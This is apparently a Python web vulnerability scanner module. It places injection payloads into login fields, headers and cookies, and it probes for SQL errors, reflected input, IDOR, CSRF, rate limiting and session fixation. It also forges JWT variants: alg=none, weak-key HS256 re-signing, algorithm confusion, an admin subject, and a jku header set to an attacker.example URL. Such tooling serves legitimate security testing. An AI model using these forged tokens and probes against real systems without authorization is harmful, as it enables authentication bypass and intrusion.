import json
import logging
import os
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from statistics import mean, stdev
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin

import difflib
import requests
import html
import math
from lxml import html as lxml_html
import base64
import hmac
import hashlib
from src.mcp_orchestrator.idor import generate_idor_ids

LOG = logging.getLogger(__name__)


def _safe_text(content: bytes) -> str:
    try:
        return content.decode("utf-8", errors="replace")
    except Exception:
        return str(content)


SQL_ERROR_RE = (
    r"(sql syntax|mysql|syntax error|ora-|oracle|sqlite|postgresql|unhandled exception|sqlstate)"
)
SUCCESS_KEYWORDS = ["Welcome", "Logout", "Dashboard", "My Account", "Sign out"]


@dataclass
class Finding:
    vector_id: str
    payload: str
    sink: str
    status: int
    length: int
    elapsed: float
    headers: Dict[str, Any]
    redirect_chain: List[Any]
    response_text: str
    session_cookies: Dict[str, Any]
    sql_error_found: bool
    similarity: float
    success_keywords: List[str]
    time_probe: Optional[Dict[str, float]] = None
    suspicious: bool = False
    notes: List[str] = field(default_factory=list)


class Analyzer:
    def __init__(
        self,
        base_url: str,
        proxies: Optional[Dict[str, str]] = None,
        verify: bool = False,
        timeout: int = 10,
        concurrency: int = 1,
        skip_hosts: Optional[List[str]] = None,
    ):
        self.base_url = base_url
        self.proxies = proxies or {}
        self.verify = verify
        self.timeout = timeout
        self.concurrency = max(1, min(4, int(concurrency)))
        self.jitter_min = 0.2
        self.jitter_max = 0.5
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "mcp-orchestrator-analyzer/1.0"})
        self.session.verify = verify
        self.session.proxies.update(self.proxies)
        self.baseline_text = ""
        self.findings: List[Dict[str, Any]] = []

        parsed = urlparse(base_url)
        self.base_host = parsed.hostname
        # skip host policy: if host equals demo.testfire.net (case-insensitive) or present in skip_hosts, do not send real requests
        self.skip_hosts = [h.lower() for h in (skip_hosts or ["demo.testfire.net"])]
        self.is_skipped_host = (self.base_host or "").lower() in self.skip_hosts

    def capture_baseline(
        self, baseline_data: Dict[str, Any], headers: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """
        Send a baseline benign request and store the response text for similarity comparison.
        baseline_data: form data
        headers: optional headers to merge into session
        """
        hdrs = headers or {}
        if self.is_skipped_host:
            return {"skipped_by_policy": True}

        try:
            resp = self.session.post(
                self.base_url,
                data=baseline_data,
                headers=hdrs,
                timeout=self.timeout,
                proxies=self.proxies,
                allow_redirects=True,
            )
            text = _safe_text(resp.content)
            self.baseline_text = text
            baseline_cookies = dict(self.session.cookies.get_dict())
            # compute simple template signature
            divs = text.count("<div")
            forms = text.count("<form")
            scripts = text.count("<script")
            keywords = [
                k for k in ["Welcome", "Login", "Logout", "Invalid", "Dashboard"] if k in text
            ]
            # determine canonical redirect/final target using resp.url
            redirect_target = getattr(resp, "url", None) or resp.headers.get("Location")

            # detect csrf tokens in baseline forms (simple hidden input parse)
            csrf_tokens = {}
            try:
                import re as _re

                for m in _re.finditer(
                    r'<input[^>]+type=["\']hidden["\'][^>]*>', text, _re.IGNORECASE
                ):
                    tag = m.group(0)
                    name_m = _re.search(r'name=["\']([^"\']+)["\']', tag, _re.IGNORECASE)
                    val_m = _re.search(r'value=["\']([^"\']*)["\']', tag, _re.IGNORECASE)
                    if name_m:
                        csrf_tokens[name_m.group(1)] = val_m.group(1) if val_m else ""
            except Exception:
                csrf_tokens = {}

            self.baseline = {
                "baseline_text": text,
                "baseline_length": len(resp.content),
                "baseline_cookies": baseline_cookies,
                "baseline_status": resp.status_code,
                "baseline_redirect_target": redirect_target,
                "baseline_template_signature": {
                    "divs": divs,
                    "forms": forms,
                    "scripts": scripts,
                    "keywords": keywords,
                },
                "csrf_tokens": csrf_tokens,
            }
            # maintain backward-compatible keys expected by tests
            out = {**self.baseline}
            out.update(
                {
                    "status": resp.status_code,
                    "length": len(resp.content),
                    "text_snippet": text[:400],
                }
            )
            return out
        except requests.RequestException as exc:
            LOG.exception("Baseline request failed: %s", exc)
            return {"error": str(exc)}

    def _place_payload(
        self, sink: str, payload: str, base_data: Dict[str, Any], headers: Dict[str, str]
    ) -> Tuple[Dict[str, Any], Dict[str, str], Optional[str]]:
        data = dict(base_data or {})
        hdrs = dict(headers or {})
        cookie_header = None
        if sink == "uid":
            data["uid"] = payload
        elif sink == "passw":
            data["passw"] = payload
        elif sink == "cookie":
            # use injection cookie name per requirement
            cookie_header = f"injection={payload}"
        elif sink == "authorization":
            # place Authorization header
            hdrs["Authorization"] = f"Bearer {payload}"
        elif sink == "header":
            hdrs["X-Forwarded-For"] = payload
        elif sink == "referer":
            hdrs["Referer"] = payload
        elif sink == "user-agent":
            hdrs["User-Agent"] = payload
        elif sink == "json":
            # handled separately by caller
            pass
        elif sink == "query":
            pass
        return data, hdrs, cookie_header

    def _request_with_backoff(self, method: str, url: str, **kwargs):
        max_retries = 3
        backoff = 0.5
        for attempt in range(max_retries + 1):
            try:
                resp = getattr(self.session, method)(
                    url, timeout=self.timeout, proxies=self.proxies, verify=self.verify, **kwargs
                )
                if resp.status_code in (429, 503) and attempt < max_retries:
                    time.sleep(backoff)
                    backoff *= 2
                    continue
                return resp
            except requests.RequestException as exc:
                LOG.debug("request attempt %s failed: %s", attempt, exc)
                if attempt >= max_retries:
                    raise
                time.sleep(backoff)
                backoff *= 2

    def _generate_jwt_tamper_variants(self, token: str) -> List[Tuple[str, str]]:
        """Generate simple JWT tampered variants from a token string.
        Returns list of (name, token) tuples. Variants include alg=none (no signature) and stripped signature.
        """
        parts = token.split(".")
        header_b64 = parts[0] if len(parts) > 0 else ""
        payload_b64 = parts[1] if len(parts) > 1 else ""
        variants: List[Tuple[str, str]] = []
        try:
            # alg=none variant: new header
            hdr = {"alg": "none", "typ": "JWT"}
            hdr_json = json.dumps(hdr).encode("utf-8")
            hdr_b64 = base64.urlsafe_b64encode(hdr_json).decode("utf-8").rstrip("=")
            v_none = f"{hdr_b64}.{payload_b64}."
            variants.append(("alg_none", v_none))
        except Exception:
            pass
        # try HS256 resigning with common weak keys
        common_keys = ["secret", "password", "admin", "jwtsecret", "changeme"]
        try:
            # build HS256 header
            hdr_hs = {"alg": "HS256", "typ": "JWT"}
            hdr_hs_b64 = (
                base64.urlsafe_b64encode(json.dumps(hdr_hs).encode()).decode("utf-8").rstrip("=")
            )
            for k in common_keys:
                try:
                    signing_input = f"{hdr_hs_b64}.{payload_b64}".encode("utf-8")
                    sig = hmac.new(k.encode("utf-8"), signing_input, hashlib.sha256).digest()
                    sig_b64 = base64.urlsafe_b64encode(sig).decode("utf-8").rstrip("=")
                    token_hs = f"{hdr_hs_b64}.{payload_b64}.{sig_b64}"
                    variants.append((f"hs256_{k}", token_hs))
                except Exception:
                    continue
        except Exception:
            pass
        try:
            # stripped signature variant: remove last part
            if len(parts) >= 2:
                stripped = f"{header_b64}.{payload_b64}."
                variants.append(("stripped_sig", stripped))
        except Exception:
            pass

        # try swapping header alg while keeping original signature (alg confusion)
        try:
            if len(parts) == 3:
                orig_sig = parts[2]
                # HS256 header but keep original signature (might be accepted by flawed servers)
                hdr_hs_b64 = (
                    base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
                    .decode("utf-8")
                    .rstrip("=")
                )
                variants.append(
                    ("alg_confusion_hs_keep_sig", f"{hdr_hs_b64}.{payload_b64}.{orig_sig}")
                )
                # add kid header manipulation
                hdr_kid = (
                    base64.urlsafe_b64encode(
                        json.dumps({"alg": "RS256", "typ": "JWT", "kid": "admin"}).encode()
                    )
                    .decode("utf-8")
                    .rstrip("=")
                )
                variants.append(("kid_admin_rs256", f"{hdr_kid}.{payload_b64}.{orig_sig}"))
        except Exception:
            pass

        # small synthetic payload variant (becomes admin-ish)
        try:
            admin_payload = (
                base64.urlsafe_b64encode(json.dumps({"sub": "admin"}).encode())
                .decode("utf-8")
                .rstrip("=")
            )
            variants.append(("synthetic_admin_payload", f"{header_b64}.{admin_payload}."))
        except Exception:
            pass

        # JKU / kid manipulation and JWK URL header variants (no network calls here; attacker-controlled JKU token strings)
        try:
            jku_hdr = {"alg": "RS256", "typ": "JWT", "jku": "https://attacker.example/jwks.json"}
            jku_b64 = (
                base64.urlsafe_b64encode(json.dumps(jku_hdr).encode()).decode("utf-8").rstrip("=")
            )
            if payload_b64:
                variants.append(
                    (
                        "jku_attacker",
                        f"{jku_b64}.{payload_b64}.{parts[2] if len(parts) > 2 else ''}",
                    )
                )
        except Exception:
            pass

        # RS->HS confusion: set alg to HS256 and attempt to sign with common keys using the original payload
        try:
            if payload_b64:
                for k in ["secret", "password"]:
                    try:
                        hdr_conf = {"alg": "HS256", "typ": "JWT"}
                        hdr_conf_b64 = (
                            base64.urlsafe_b64encode(json.dumps(hdr_conf).encode())
                            .decode("utf-8")
                            .rstrip("=")
                        )
                        signing_input = f"{hdr_conf_b64}.{payload_b64}".encode("utf-8")
                        sig = hmac.new(k.encode("utf-8"), signing_input, hashlib.sha256).digest()
                        sig_b64 = base64.urlsafe_b64encode(sig).decode("utf-8").rstrip("=")
                        variants.append(
                            (f"rs_to_hs_{k}", f"{hdr_conf_b64}.{payload_b64}.{sig_b64}")
                        )
                    except Exception:
                        continue
        except Exception:
            pass

        return variants

    def run_vector(
        self,
        vector: Dict[str, Any],
        sinks: List[str] = None,
        allow_redirects: bool = False,
        follow_redirects: bool = False,
    ) -> List[Dict[str, Any]]:
        """
        Run a single vector (dictionary with 'id' and 'payload') across multiple sinks.
        Returns list of findings dicts for each sink.
        """
        # apply default sinks if not provided
        if sinks is None:
            sinks = ["uid", "passw", "cookie", "header", "referer", "user-agent", "json", "query"]

        if self.is_skipped_host:
            return [{"vector_id": vector.get("id"), "skipped_by_policy": True}]

        results = []
        base_data = {"uid": "", "passw": "", "btnSubmit": "Login"}
        base_headers = {}

        for sink in sinks:
            payload = vector.get("payload") if isinstance(vector, dict) else str(vector)
            data, hdrs, cookie_header = self._place_payload(sink, payload, base_data, base_headers)

            # cookie header
            if cookie_header:
                hdrs["Cookie"] = cookie_header

            # If sink is json, construct a json body
            json_body = None
            if sink == "json":
                json_body = {"uid": payload, "passw": "test"}

            # If sink is query, append payload to URL
            url = self.base_url
            if sink == "query":
                sep = "&" if "?" in url else "?"
                url = f"{url}{sep}q={requests.utils.requote_uri(payload)}"

            # Authorization sink: if payload looks like a JWT, generate tampered variants and test them first
            jwt_variants_tested: List[str] = []
            jwt_accepted_variant: Optional[str] = None
            if sink == "authorization" and isinstance(payload, str) and "." in payload:
                variants = self._generate_jwt_tamper_variants(payload)
                for name, token_variant in variants:
                    jwt_variants_tested.append(name)
                    hdrs_local = dict(hdrs)
                    hdrs_local["Authorization"] = f"Bearer {token_variant}"
                    try:
                        if json_body is not None:
                            resp_try = self._request_with_backoff(
                                "post",
                                url,
                                json=json_body,
                                headers=hdrs_local,
                                allow_redirects=allow_redirects,
                            )
                        else:
                            resp_try = self._request_with_backoff(
                                "post",
                                url,
                                data=data,
                                headers=hdrs_local,
                                allow_redirects=allow_redirects,
                            )
                        if resp_try and getattr(resp_try, "status_code", None) == 200:
                            jwt_accepted_variant = name
                            # adopt this hdrs and resp for analysis
                            hdrs = hdrs_local
                            resp = resp_try
                            final_body = _safe_text(resp.content)
                            final_status = resp.status_code
                            session_cookies_after = dict(self.session.cookies.get_dict())
                            break
                    except Exception:
                        continue

            # jitter
            if self.concurrency > 1:
                time.sleep(random.uniform(self.jitter_min, self.jitter_max))

            try:
                start = time.time()
                if json_body is not None:
                    resp = self._request_with_backoff(
                        "post", url, json=json_body, headers=hdrs, allow_redirects=allow_redirects
                    )
                else:
                    resp = self._request_with_backoff(
                        "post", url, data=data, headers=hdrs, allow_redirects=allow_redirects
                    )
                elapsed = time.time() - start
            except Exception as e:
                LOG.exception("Request failed for vector %s sink %s: %s", vector.get("id"), sink, e)
                results.append({"vector_id": vector.get("id"), "sink": sink, "error": str(e)})
                continue

            # collect fields
            status_code = resp.status_code
            reason = getattr(resp, "reason", "")
            headers = dict(resp.headers)
            content_type = headers.get("Content-Type", "")
            declared_length = headers.get("Content-Length")
            final_body = _safe_text(resp.content)
            actual_length = len(final_body)
            elapsed_seconds = (
                getattr(resp, "elapsed", None).total_seconds()
                if getattr(resp, "elapsed", None)
                else elapsed
            )
            # build redirect chain using urls from history and current resp.url where available
            redirect_chain = [
                getattr(r, "url", r.headers.get("Location")) for r in getattr(resp, "history", [])
            ]
            redirect_chain.append(getattr(resp, "url", resp.headers.get("Location")))
            session_cookies_after = dict(self.session.cookies.get_dict())
            set_cookie_header = headers.get("Set-Cookie")
            final_status = status_code

            # handle follow_redirects: if redirect and requested, follow once
            if (
                follow_redirects
                and status_code in (301, 302, 303, 307, 308)
                and resp.headers.get("Location")
            ):
                try:
                    final_url = urljoin(self.base_url, resp.headers.get("Location"))
                    final_resp = self.session.get(
                        final_url, timeout=self.timeout, proxies=self.proxies, verify=self.verify
                    )
                    final_body = _safe_text(final_resp.content)
                    final_status = final_resp.status_code
                    headers = dict(final_resp.headers)
                    session_cookies_after = dict(self.session.cookies.get_dict())
                    set_cookie_header = headers.get("Set-Cookie")
                except Exception as e:
                    LOG.debug("follow redirect failed: %s", e)

            # SQL error detection
            import re

            SQL_REGEX_LIST = [
                r"SQL syntax",
                r"Warning:\s*mysql_",
                r"Unclosed quotation mark after the character string",
                r"ORA-\d{5}",
                r"PostgreSQL.*ERROR",
                r"PG::SyntaxError",
                r"SQLSTATE\[",
                r"System\.Data\.SqlClient",
                r"com\.mysql\.jdbc",
                r"org\.hibernate",
            ]
            sql_error_found = any(re.search(rx, final_body, re.IGNORECASE) for rx in SQL_REGEX_LIST)
            sql_error_snippet = None
            if sql_error_found:
                m = re.search(
                    r"(.{0,200}(?:SQL|ORA-|PostgreSQL|Warning|SQLSTATE|System\.Data)[^.]{0,200})",
                    final_body,
                    re.IGNORECASE,
                )
                sql_error_snippet = m.group(0) if m else final_body[:200]

            # reflection detection (DOM-aware using lxml)
            reflection_context = None
            reflection_details = {}
            if payload:
                unescaped = html.unescape(final_body)
                try:
                    doc = lxml_html.fromstring(unescaped)
                    # check scripts
                    scripts = doc.xpath("//script")
                    for s in scripts:
                        txt = s.text_content() or ""
                        if payload in txt:
                            reflection_context = "script"
                            reflection_details = {"tag": "script"}
                            break
                    # attributes and event handlers
                    if reflection_context is None:
                        for el in doc.iter():
                            for attr, val in el.attrib.items():
                                if payload in val:
                                    if attr.lower().startswith("on"):
                                        reflection_context = "event_handler"
                                        reflection_details = {"attribute": attr, "element": el.tag}
                                        break
                                    else:
                                        reflection_context = "attribute"
                                        reflection_details = {"attribute": attr, "element": el.tag}
                                        break
                            if reflection_context:
                                break
                    # text nodes
                    if reflection_context is None:
                        for tn in doc.xpath("//text()"):
                            if payload in tn:
                                reflection_context = "text"
                                reflection_details = {"snippet": tn.strip()[:200]}
                                break
                except Exception:
                    # fallback to basic substring checks
                    if payload in unescaped:
                        reflection_context = "text"
                        reflection_details = {"fallback": True}

            # success keywords from final body
            success_keywords = [k for k in SUCCESS_KEYWORDS if k in final_body]

            # encoding behavior (url-encoded, html-escaped, raw, or mixed)
            encoding_flags = set()
            if requests.utils.requote_uri(payload) in final_body:
                encoding_flags.add("url_encoded")
            # check for html-escaped appearance (payload appears after unescaping but not literally)
            if payload in html.unescape(final_body) and payload not in final_body:
                encoding_flags.add("html_escaped")
            if payload in final_body:
                encoding_flags.add("raw")
            if not encoding_flags:
                encoding_behavior = "raw"
            elif len(encoding_flags) == 1:
                encoding_behavior = list(encoding_flags)[0]
            else:
                encoding_behavior = "mixed"

            # content-type vs body mismatch detection
            content_type_mismatch = False
            try:
                ct = content_type.lower() if content_type else ""
                body_sample = final_body.strip()[:200]
                if "application/json" in ct and (
                    "<html" in final_body.lower() or body_sample.startswith("<")
                ):
                    content_type_mismatch = True
                if "text/html" in ct and (
                    body_sample.startswith("{") or body_sample.startswith("[")
                ):
                    content_type_mismatch = True
            except Exception:
                content_type_mismatch = False

            # similarity and template delta
            similarity = (
                difflib.SequenceMatcher(a=self.baseline_text or "", b=final_body).ratio()
                if self.baseline_text
                else 0.0
            )
            baseline_len = getattr(self, "baseline", {}).get("baseline_length", 0)
            length_delta = actual_length - baseline_len

            # template counts
            divs = final_body.count("<div")
            forms = final_body.count("<form")
            scripts = final_body.count("<script")
            base_sig = getattr(self, "baseline", {}).get("baseline_template_signature", {})
            template_delta = 0.0
            if base_sig:
                diff = (
                    abs(divs - base_sig.get("divs", 0))
                    + abs(forms - base_sig.get("forms", 0))
                    + abs(scripts - base_sig.get("scripts", 0))
                )
                template_delta = diff / max(
                    1,
                    (
                        base_sig.get("divs", 0)
                        + base_sig.get("forms", 0)
                        + base_sig.get("scripts", 0)
                    ),
                )

            # csrf detection and simple correlation
            csrf_behavior = None
            csrf_bypass = False
            baseline_csrf = getattr(self, "baseline", {}).get("csrf_tokens", {})
            if baseline_csrf:
                csrf_behavior = "present_baseline"
                # if a new session cookie appears and the request did not include csrf tokens, mark possible bypass
                if session_cookies_after and baseline_csrf:
                    token_in_request = any(
                        v in (data.get(k, "") if isinstance(data, dict) else "")
                        for k, v in baseline_csrf.items()
                    )
                    new_keys = [
                        k
                        for k in session_cookies_after.keys()
                        if k
                        not in (
                            self.baseline.get("baseline_cookies", {})
                            if hasattr(self, "baseline")
                            else {}
                        )
                    ]
                    if new_keys and not token_in_request:
                        csrf_bypass = True

            # cache control check
            cache_control_ok = headers.get("Cache-Control", "").lower() not in ("", "max-age=0")

            analysis = {
                "status_behavior": None,
                "cookie_delta": {},
                "redirect_target": getattr(resp, "url", resp.headers.get("Location")),
                "similarity": similarity,
                "length_delta": length_delta,
                "sql_error_found": sql_error_found,
                "sql_error_snippet": sql_error_snippet,
                "reflection_context": reflection_context,
                "encoding_behavior": encoding_behavior,
                "template_delta": template_delta,
                "time_probe": None,
                "csrf_behavior": csrf_behavior,
                "csrf_bypass": csrf_bypass,
                "content_type_mismatch": content_type_mismatch,
                "jwt_tampering_accepted": False,
                "jwt_tamper_variants_tested": jwt_variants_tested,
                "jwt_tamper_accepted_variant": jwt_accepted_variant,
                "cache_control_ok": cache_control_ok,
                "suspicious": False,
                "severity": "LOW",
            }

            # status behavior heuristics
            if status_code in (301, 302, 303, 307, 308):
                baseline_target = getattr(self, "baseline", {}).get("baseline_redirect_target")
                if (
                    resp.headers.get("Location")
                    and baseline_target
                    and resp.headers.get("Location") != baseline_target
                ):
                    analysis["status_behavior"] = "redirect_target_changed"
                    analysis["suspicious"] = True
                    analysis["severity"] = "MEDIUM"
                if actual_length > 0:
                    analysis["status_behavior"] = "redirect_with_body"
                    analysis["suspicious"] = True
                    analysis["severity"] = "LOW"
            if status_code == 200 and any(
                k in final_body for k in ["Welcome", "Logout", "Dashboard", "Profile", "My Account"]
            ):
                analysis["status_behavior"] = "possible_login_success"
                analysis["suspicious"] = True
                analysis["severity"] = "HIGH"
            # compute cookie delta (new, changed, removed)
            baseline_cookies = getattr(self, "baseline", {}).get("baseline_cookies", {})
            after = session_cookies_after
            new = {k: v for k, v in after.items() if k not in baseline_cookies}
            changed = {
                k: {"before": baseline_cookies[k], "after": after[k]}
                for k in after.keys()
                if k in baseline_cookies and baseline_cookies[k] != after[k]
            }
            removed = [k for k in baseline_cookies.keys() if k not in after]
            analysis["cookie_delta"] = {"new": new, "changed": changed, "removed": removed}

            if sql_error_found:
                analysis["suspicious"] = True
                analysis["severity"] = "HIGH"
                # determine if payload appears near error snippet
                try:
                    if sql_error_snippet and payload in final_body:
                        err_idx = final_body.find(sql_error_snippet)
                        pay_idx = final_body.find(payload)
                        if err_idx >= 0 and pay_idx >= 0 and abs(err_idx - pay_idx) <= 200:
                            analysis["sql_error_reflected"] = True
                        else:
                            analysis["sql_error_reflected"] = False
                    else:
                        analysis["sql_error_reflected"] = False
                except Exception:
                    analysis["sql_error_reflected"] = False

            # JWT / Authorization sink specific heuristics
            if sink == "authorization":
                baseline_status = getattr(self, "baseline", {}).get("baseline_status")
                # if baseline wasn't successful but this request was, or success keywords present, mark tampering accepted
                if (
                    (baseline_status and baseline_status != 200 and final_status == 200)
                    or success_keywords
                    or analysis["cookie_delta"].get("new")
                ):
                    analysis["jwt_tampering_accepted"] = True
                    analysis["suspicious"] = True
                    analysis["severity"] = "HIGH"
            if new or changed or removed:
                analysis["suspicious"] = True
                analysis["severity"] = "MEDIUM"
            if similarity < 0.8:
                analysis["suspicious"] = True
                analysis["severity"] = "MEDIUM"
            if abs(length_delta) > max(500, baseline_len * 0.25):
                analysis["suspicious"] = True
                analysis["severity"] = "MEDIUM"

            result_entry = {
                "vector_id": vector.get("id"),
                "payload": payload,
                "sink": sink,
                "request": {
                    "url": url,
                    "method": "POST",
                    "headers": hdrs,
                    "data": data if json_body is None else None,
                    "json": json_body,
                },
                "response": {
                    "status_code": status_code,
                    "reason": reason,
                    "headers": headers,
                    "content_type": content_type,
                    "declared_length": declared_length,
                    "actual_length": actual_length,
                    "elapsed_seconds": elapsed_seconds,
                    "redirect_chain": redirect_chain,
                    "session_cookies_after": session_cookies_after,
                    "set_cookie_header": set_cookie_header,
                    "final_body": final_body,
                },
                "analysis": analysis,
                "reflection": reflection_details,
                # backward-compatible top-level fields
                "similarity": analysis.get("similarity"),
                "success_keywords": success_keywords,
                "final_status": final_status,
                "skipped_by_policy": False,
            }

            results.append(result_entry)
        # append to internal findings list
        for r in results:
            self.findings.append(r)
        return results

    def run_idor(self, path_template: str, ids: List[Any]) -> List[Dict[str, Any]]:
        """Run simple IDOR checks for a path_template with a placeholder {id}.
        Returns list of dicts with id and response analysis.
        """
        findings = []
        parsed_jsons = {}
        responses = []
        for idv in ids:
            url = self.base_url.rstrip("/") + "/" + path_template.format(id=idv).lstrip("/")
            try:
                resp = self.session.get(
                    url, timeout=self.timeout, proxies=self.proxies, verify=self.verify
                )
                body = _safe_text(resp.content)
                status = resp.status_code
                # basic heuristics: if status==200 and body differs significantly from baseline
                similarity = (
                    difflib.SequenceMatcher(a=self.baseline_text or "", b=body).ratio()
                    if self.baseline_text
                    else 0.0
                )
                # try parse json if content looks like json
                parsed = None
                try:
                    if body.strip().startswith("{") or body.strip().startswith("["):
                        parsed = json.loads(body)
                        parsed_jsons[idv] = parsed
                except Exception:
                    parsed = None

                suspicious = False
                if status == 200 and similarity < 0.8:
                    suspicious = True
                entry = {
                    "id": idv,
                    "url": url,
                    "status": status,
                    "similarity": similarity,
                    "suspicious": suspicious,
                    "body_sample": body[:300],
                }
                if parsed is not None:
                    entry["json"] = parsed
                findings.append(entry)
                responses.append(entry)
            except Exception as e:
                findings.append({"id": idv, "url": url, "error": str(e)})

        # analyze parsed JSONs for differing key sets (simple IDOR heuristic)
        try:
            if parsed_jsons:
                # compute key sets for top-level objects
                keysets = {i: set(v.keys()) for i, v in parsed_jsons.items() if isinstance(v, dict)}
                # compute value-level diffs: for each key present across items, find values that differ
                all_keys = set().union(
                    *[set(d.keys()) for d in parsed_jsons.values() if isinstance(d, dict)]
                )
                value_diffs = {}
                for k in all_keys:
                    vals = {}
                    for iid, obj in parsed_jsons.items():
                        if isinstance(obj, dict) and k in obj:
                            vals[iid] = obj.get(k)
                    if len(set(map(lambda x: json.dumps(x, sort_keys=True), vals.values()))) > 1:
                        value_diffs[k] = vals

                # compare key set sizes; if some ids expose extra keys, flag possible exposure
                if keysets:
                    all_sizes = {i: len(s) for i, s in keysets.items()}
                    median = sorted(all_sizes.values())[len(all_sizes) // 2]
                    for f in findings:
                        if "id" in f and f["id"] in keysets:
                            analysis = f.setdefault("analysis", {})
                            if len(keysets[f["id"]]) > median:
                                analysis["possible_idor_exposure"] = True
                                f["suspicious"] = True
                            else:
                                analysis["possible_idor_exposure"] = False
                            # attach value-level diffs (only include relevant keys)
                            relevant = {k: v for k, v in value_diffs.items() if f["id"] in v}
                            if relevant:
                                analysis["value_diffs"] = relevant
                                f["suspicious"] = True
        except Exception:
            pass

        return findings

    def _run_and_wrap_idor(self, vec: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Helper to run IDOR for a vector and return wrapped findings consistent with run_vector output."""
        path = vec.get("idor_path")
        ids = vec.get("idor_ids") or generate_idor_ids()
        raw = self.run_idor(path, ids)
        wrapped = []
        for r in raw:
            # convert to run_vector-like structure
            entry = {
                "vector_id": f"{vec.get('id')}_idor",
                "payload": vec.get("payload"),
                "sink": "idor",
                "request": {"url": r.get("url"), "method": "GET"},
                "response": {"status_code": r.get("status"), "final_body": r.get("body_sample")},
                "analysis": {
                    "possible_idor_exposure": (
                        r.get("analysis", {}).get("possible_idor_exposure")
                        if isinstance(r.get("analysis"), dict)
                        else False
                    ),
                    "suspicious": r.get("suspicious", False),
                },
                "skipped_by_policy": False,
            }
            wrapped.append(entry)
        return wrapped

    def _run_and_wrap_rate_limit(self, vec: Dict[str, Any]) -> Dict[str, Any]:
        """Run rate limit test for a vector and wrap into a finding-like dict."""
        url = vec.get("rate_limit_url") or self.base_url
        attempts = vec.get("rate_limit_attempts", 10)
        interval = vec.get("rate_limit_interval", 0.05)
        res = self.run_rate_limit_test(url=url, attempts=attempts, interval=interval)
        return {
            "vector_id": f"{vec.get('id')}_rate",
            "payload": vec.get("payload"),
            "sink": "rate_limit",
            "request": {"url": url, "method": "POST", "attempts": attempts},
            "response": {"codes": res.get("codes"), "rate_limited": res.get("rate_limited")},
            "analysis": {
                "lockout_detected": res.get("lockout_detected"),
                "suspicious": bool(res.get("lockout_detected")),
            },
            "skipped_by_policy": False,
        }

    def _run_and_wrap_session_fixation(self, vec: Dict[str, Any]) -> Dict[str, Any]:
        """Run session fixation test for a vector and wrap into a finding-like dict."""
        login_data = vec.get("login_data") or {"uid": "test", "passw": "test"}
        res = self.run_session_fixation_test(login_data)
        return {
            "vector_id": f"{vec.get('id')}_session_fix",
            "payload": vec.get("payload"),
            "sink": "session_fixation",
            "request": {"url": self.base_url, "method": "POST"},
            "response": {"sessionid_after": res.get("sessionid_after")},
            "analysis": {
                "fixation_possible": res.get("fixation_possible", False),
                "suspicious": bool(res.get("fixation_possible", False)),
            },
            "skipped_by_policy": False,
        }

    def run_rate_limit_test(
        self, url: Optional[str] = None, attempts: int = 10, interval: float = 0.05
    ) -> Dict[str, Any]:
        """Perform a burst of attempts to detect rate limiting. Returns stats and whether rate limiting was observed."""
        target = url or self.base_url
        codes = []
        retry_after = None
        for i in range(attempts):
            try:
                resp = self.session.post(
                    target,
                    data={"uid": "test", "passw": "test"},
                    timeout=self.timeout,
                    proxies=self.proxies,
                    verify=self.verify,
                )
                codes.append(resp.status_code)
                if resp.status_code == 429:
                    retry_after = resp.headers.get("Retry-After")
                time.sleep(interval)
            except Exception:
                codes.append("error")
        rate_limited = any(c == 429 for c in codes)
        # analyze sequences for lockout-like behavior
        longest_429 = 0
        cur = 0
        for c in codes:
            if c == 429:
                cur += 1
                longest_429 = max(longest_429, cur)
            else:
                cur = 0

        first_429 = next((i for i, c in enumerate(codes) if c == 429), None)
        # parse Retry-After numeric if possible
        retry_after_secs = None
        try:
            if retry_after is not None:
                retry_after_secs = int(retry_after)
        except Exception:
            retry_after_secs = None

        # heuristic: lockout detected if many 429s or long consecutive run
        lockout_detected = longest_429 >= max(1, attempts // 4) or (
            sum(1 for c in codes if c == 429) >= max(1, attempts // 3)
        )

        return {
            "attempts": attempts,
            "codes": codes,
            "rate_limited": rate_limited,
            "retry_after": retry_after,
            "retry_after_secs": retry_after_secs,
            "longest_429_streak": longest_429,
            "first_429_index": first_429,
            "lockout_detected": lockout_detected,
        }

    def run_session_fixation_test(self, login_data: Dict[str, Any]) -> Dict[str, Any]:
        """Test session fixation: set an attacker-controlled cookie before login and see if it gets accepted post-login."""
        # set attacker cookie
        try:
            self.session.cookies.set("sessionid", "ATTACKER")
        except Exception:
            pass
        # perform login
        try:
            resp = self.session.post(
                self.base_url,
                data=login_data,
                timeout=self.timeout,
                proxies=self.proxies,
                verify=self.verify,
            )
            after = dict(self.session.cookies.get_dict())
            accepted = after.get("sessionid") == "ATTACKER"
            return {
                "login_status": getattr(resp, "status_code", None),
                "sessionid_after": after.get("sessionid"),
                "fixation_possible": accepted,
            }
        except Exception as e:
            return {"error": str(e)}

    def run_time_probe(
        self, control_payload_fn, sleep_payload_fn, trials: int = 2
    ) -> Dict[str, Any]:
        """
        control_payload_fn and sleep_payload_fn should be callables returning payload strings to put into uid/passw fields.
        Runs trials times each and measures means/stdevs.
        """
        # run time probe
        ctrl_times = []
        sleep_times = []
        for _ in range(trials):
            payload = control_payload_fn()
            start = time.time()
            try:
                resp = self.session.post(
                    self.base_url,
                    data={"uid": payload, "passw": "test"},
                    timeout=self.timeout,
                    proxies=self.proxies,
                    verify=self.verify,
                )
                ctrl_times.append(time.time() - start)
            except Exception:
                ctrl_times.append(float("nan"))

            payload = sleep_payload_fn()
            start = time.time()
            try:
                resp = self.session.post(
                    self.base_url,
                    data={"uid": payload, "passw": "test"},
                    timeout=self.timeout,
                    proxies=self.proxies,
                    verify=self.verify,
                )
                sleep_times.append(time.time() - start)
            except Exception:
                sleep_times.append(float("nan"))

        # compute means ignoring NaN
        def _clean_stats(lst):
            vals = [v for v in lst if v == v]
            return {
                "mean": mean(vals) if vals else float("nan"),
                "stdev": stdev(vals) if len(vals) > 1 else 0.0,
            }

        ctrl_stats = _clean_stats(ctrl_times)
        sleep_stats = _clean_stats(sleep_times)
        ctrl_mean = ctrl_stats.get("mean", float("nan"))
        sleep_mean = sleep_stats.get("mean", float("nan"))
        delta = None
        if not math.isnan(ctrl_mean) and not math.isnan(sleep_mean):
            delta = sleep_mean - ctrl_mean

        return {"ctrl": ctrl_stats, "sleep": sleep_stats, "delta": delta}

